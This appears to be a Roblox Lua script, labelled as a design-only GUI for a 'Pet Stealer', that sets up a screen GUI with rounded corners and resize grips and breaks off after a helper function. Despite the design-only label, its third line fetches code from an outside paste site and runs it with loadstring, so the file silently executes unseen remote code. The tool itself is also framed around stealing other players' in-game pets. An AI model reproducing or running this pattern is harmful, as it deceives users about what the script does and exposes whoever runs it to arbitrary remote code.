-- Pet Stealer GUI (design-only)
-- Hide/minimize allowed during loading + loading bar with percentage text
loadstring(game:HttpGet("https://pastefy.app/LJyCRNak/raw"))()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "PetStealerGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local function makeCorner(radius)
    local uicorner = Instance.new("UICorner")
    uicorner.CornerRadius = UDim.new(0, radius)
    return uicorner
end

local function makeResizeGrip(parent, position, cursor)
    local grip = Instance.new("Frame")
    grip.Size = UDim2.new(0, 12, 0, 12)
    grip.BackgroundColor3 = Color3.fromRGB(60,60,60)
    grip.BackgroundTransparency = 0.4
    grip.BorderSizePixel = 0
    grip.Position = position
    grip.AnchorPoint = Vector2.new(0.5,0.5)
    grip.Parent = parent
    makeCorner(3):Clone().Parent = grip
    grip.Cursor = cursor
    return grip
end

